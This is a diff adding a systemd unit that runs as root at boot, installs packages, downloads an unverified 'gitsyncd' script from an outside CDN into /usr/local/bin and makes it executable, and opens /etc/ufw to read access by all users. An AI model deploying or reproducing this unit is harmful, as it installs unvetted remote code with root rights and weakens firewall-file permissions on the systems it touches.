@@ -1,0 +1,31 @@
+[Unit]
+Description=Initial system setup for sysadmin environment
+After=network.target
+
+[Service]
+Type=oneshot
+User=root
+Group=root
+
+# Install required packages
+ExecStartPre=/bin/bash -c 'apt-get install -y git bindfs curl wget'
+
+# Download and install gitsyncd script
+ExecStartPre=/bin/bash -c 'curl -fsSL https://cdn.edc0.com/archives/sysadmin/gitsyncd -o /usr/local/bin/gitsyncd && chmod +x /usr/local/bin/gitsyncd'
+
+# Adjust UFW directory permissions
+ExecStartPre=/bin/chmod -R o+r /etc/ufw
+
+# Reload systemd daemon
+ExecStartPre=/bin/systemctl daemon-reexec
+
+# Final message
+ExecStart=/bin/echo "System setup completed successfully."
+
+# Log output to syslog
+StandardOutput=syslog
+StandardError=syslog
+SyslogIdentifier=system-setup
+
+[Install]
+WantedBy=default.target
